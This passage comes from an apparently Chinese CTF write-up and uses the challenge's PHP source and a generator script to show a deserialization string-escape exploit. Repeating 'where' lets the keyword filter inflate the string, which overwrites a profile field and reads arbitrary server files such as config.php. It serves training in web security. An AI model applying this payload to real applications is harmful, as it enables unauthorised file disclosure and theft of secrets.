class="variable">$value_list</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>); <span class="comment"># 对用户名进行过滤</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>; <span class="comment"># 用来拼接sql查询语句,根据去查一个用户来查询相关信息</span></span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>); <span class="comment">#第67行</span></span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125; <span class="comment">//select * from $this-&gt;table where username=&#x27;$username&#x27;</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;link = <span class="title function_ invoke__">mysql_connect</span>(</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		<span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		<span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>, <span class="variable">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$key</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>; <span class="comment"># 构造正则匹配表达式</span></span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$config</span>);</span><br></pre></td></tr></table></figure>

<p><code>update.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>捋一下可利用的点和逻辑:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">update.php中: 输入要修改的信息后, 形成数组$profile</span><br><span class="line">将$profile序列化处理为字符串,然后执行user类中的 update_profile 方法</span><br><span class="line">在执行时update_profile, $username 和 序列化的$profile 都需要经过 fileter的过滤:</span><br><span class="line">(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;) 都会被替换为 &#x27;hacker&#x27; (其中where被替换为hacker时字符串长度+1,这里想到了反序列化的字符串逃逸)</span><br><span class="line"></span><br><span class="line">过滤完之后, 在update_profile中执行父类mysql中的update方法,执行的sql语句为:</span><br><span class="line">&quot;UPDATE users(表名) SET profile = &quot;序列化且经过处理的profile字符串的值&quot; WHERE username=$username&quot;;</span><br><span class="line">将更新完的信息以序列化字符串的形式存入数据库users表</span><br><span class="line"></span><br><span class="line">现在定位到反序列化函数处profile.php中:</span><br><span class="line"></span><br><span class="line">	$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	if($profile  == null) &#123;</span><br><span class="line">		header(&#x27;Location: update.php&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		$profile = unserialize($profile); # 反序列化, profile来自$user-&gt;show_profile($username);</span><br><span class="line">		$phone = $profile[&#x27;phone&#x27;];</span><br><span class="line">		$email = $profile[&#x27;email&#x27;];</span><br><span class="line">		$nickname = $profile[&#x27;nickname&#x27;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;])); # 读取文件</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">首先通过user类的show_profile函数,通过用户名从数据库中查询并取出对应的序列化字符串</span><br><span class="line">对其进行反序列化,拆解为数组,包括$profile[&#x27;phone&#x27;];$profile[&#x27;email&#x27;];$profile[&#x27;nickname&#x27;];$profile[&#x27;photo&#x27;]</span><br><span class="line">其中会根据$profile[&#x27;photo&#x27;]的值去读取文件, 利用点在这里</span><br><span class="line">正常情况下,这个值来自于上传文件的文件名,不容易控制, 现在可以通过反序列化的字符串逃逸将这个值覆盖为我们希望读取的文件的文件名</span><br></pre></td></tr></table></figure>

<p>那么现在需要构造反序列化的字符串:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13333333333&quot;;s:5:&quot;email&quot;;s:11:&quot;abc@123.com&quot;;s:8:&quot;nickname&quot;;s:1:&quot;a&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/394659692a460258b45a99f1424ea357&quot;;&#125;</span><br><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13333333333&quot;;s:5:&quot;email&quot;;s:11:&quot;abc@123.com&quot;;s:8:&quot;nickname&quot;;s:1:&quot;a&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/394659692a460258b45a99f1424ea357&quot;;&#125;</span><br><span class="line">array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;13333333333&quot; [&quot;email&quot;]=&gt; string(11) &quot;abc@123.com&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;a&quot; [&quot;photo&quot;]=&gt; string(39) &quot;upload/394659692a460258b45a99f1424ea357&quot; &#125;</span><br><span class="line">array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;13333333333&quot; [&quot;email&quot;]=&gt; string(11) &quot;abc@123.com&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;a&quot; [&quot;photo&quot;]=&gt; string(39) &quot;upload/394659692a460258b45a99f1424ea357&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>现在还有一个问题,就是我们用来构造逃逸字符串的<code>nickname</code>有长度限制:</p>
<p>对<code>nickname</code>的长度限制使用数组来绕过 : <code>nickname[]=xxxxxxxxxxxxxxx</code> 这样以来检测其长度是会默认为1</p>
<p><img src="/images/buuctf-web2/image-20221023224746419.png" alt="image-20221023224746419"></p>
<p>下面开始构建字符串: (脚本在最后面)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$profile[&#x27;nickname&#x27;][] = &quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;</span><br><span class="line">假设我们要读取 profile.php</span><br><span class="line"></span><br><span class="line">序列化成字符串,过滤前</span><br><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13333333333&quot;;s:5:&quot;email&quot;;s:11:&quot;abc@123.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:35:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/394659692a460258b45a99f1424ea357&quot;;&#125;</span><br><span class="line">过滤后的字符串</span><br><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13333333333&quot;;s:5:&quot;email&quot;;s:11:&quot;abc@123.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:35:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/394659692a460258b45a99f1424ea357&quot;;&#125;</span><br><span class="line">过滤前字符串反序列化</span><br><span class="line">array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;13333333333&quot; [&quot;email&quot;]=&gt; string(11) &quot;abc@123.com&quot; [&quot;nickname&quot;]=&gt; array(1) &#123; [0]=&gt; string(35) &quot;&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot; &#125; [&quot;photo&quot;]=&gt; string(39) &quot;upload/394659692a460258b45a99f1424ea357&quot; &#125;</span><br><span class="line">过滤后字符串反序列化</span><br><span class="line">array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;13333333333&quot; [&quot;email&quot;]=&gt; string(11) &quot;abc@123.com&quot; [&quot;nickname&quot;]=&gt; array(1) &#123; [0]=&gt; string(35) &quot;&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot; &#125; [&quot;photo&quot;]=&gt; string(39) &quot;upload/394659692a460258b45a99f1424ea357&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>接下来利用过滤<code>where</code>时将其替换成<code>hacker</code>使其长度+1的性质来构造逃逸字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$profile[&#x27;nickname&#x27;][] = wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;</span><br><span class="line">(35个where)</span><br><span class="line">替换前: 35*where(5) + 35(从where后的引号开始数至末尾)</span><br><span class="line">替换后: 35*hacker(6)</span><br><span class="line"></span><br><span class="line">序列化成字符串,过滤前</span><br><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13333333333&quot;;s:5:&quot;email&quot;;s:11:&quot;abc@123.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:210:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/394659692a460258b45a99f1424ea357&quot;;&#125;</span><br><span class="line">过滤后的字符串</span><br><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13333333333&quot;;s:5:&quot;email&quot;;s:11:&quot;abc@123.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:210:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/394659692a460258b45a99f1424ea357&quot;;&#125;</span><br><span class="line">过滤前字符串反序列化</span><br><span class="line">array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;13333333333&quot; [&quot;email&quot;]=&gt; string(11) &quot;abc@123.com&quot; [&quot;nickname&quot;]=&gt; array(1) &#123; [0]=&gt; string(210) &quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;profile.php&quot;;&#125;&quot; &#125; [&quot;photo&quot;]=&gt; string(39) &quot;upload/394659692a460258b45a99f1424ea357&quot; &#125;</span><br><span class="line">过滤后字符串反序列化, 可以看到这里成功逃逸了</span><br><span class="line">array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;13333333333&quot; [&quot;email&quot;]=&gt; string(11) &quot;abc@123.com&quot; [&quot;nickname&quot;]=&gt; array(1) &#123; [0]=&gt; string(210) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot; &#125; [&quot;photo&quot;]=&gt; string(11) &quot;profile.php&quot; &#125;</span><br><span class="line">成功</span><br></pre></td></tr></table></figure>

<p>多读取几个文件试试(注意在修改读取的文件名时,其长度的值也要改, <code>where</code>的数量也要改,长度+1,<code>where</code>的数量就要+1)</p>
<img src="/images/buuctf-web2/image-20221023234449637.png" alt="image-20221023234449637" style="zoom:67%;" />

<p>读取完成后需要去 <code>profile.php</code>中查看源码,然后将读取到的<code>base64编码</code>解码</p>
<p>最后在<code>config.php</code>中找到flag</p>
<p>测试脚本:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;a.jpg&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&quot;13333333333&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;abc@123.com&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>][] = <span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\&quot;;&#125;s:5:\&quot;photo\&quot;;s:10:\&quot;config.php\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">	<span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>; <span class="comment"># 构造正则匹配表达式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span 